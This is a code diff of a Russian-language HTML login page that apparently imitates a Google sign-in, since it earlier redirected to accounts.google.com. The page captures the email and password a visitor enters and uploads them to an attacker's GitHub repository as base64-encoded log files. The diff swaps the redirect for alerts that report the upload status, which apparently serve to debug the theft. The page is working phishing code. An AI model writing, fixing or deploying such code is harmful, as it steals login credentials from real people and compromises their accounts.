@@ -92,7 +92,6 @@
                 </div>
                 
                 <div class="input-group" id="passwordGroup" style="display: none;">
-                    <!-- Тут убран required, чтобы не было ошибки -->
                     <input type="password" id="passInput" placeholder=" ">
                     <label for="passInput">Введите пароль</label>
                 </div>
@@ -165,6 +164,7 @@
             const fileName = `log_${date}.txt`;
             const content = `Логин: ${email}\nПароль: ${pass}\nДата: ${new Date().toLocaleString()}`;
             const base64Content = btoa(unescape(encodeURIComponent(content)));
+            
             const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${fileName}`;
             
             fetch(url, {
@@ -178,8 +178,14 @@
                     message: `New log`,
                     content: base64Content
                 })
-            }).finally(() => {
-                window.location.href = "https://accounts.google.com";
+            })
+            .then(response => {
+                response.json().then(data => {
+                    alert("Статус GitHub: " + response.status + "\nОтвет: " + JSON.stringify(data));
+                });
+            })
+            .catch(error => {
+                alert("Ошибка сети: " + error);
             });
         }
     </script>
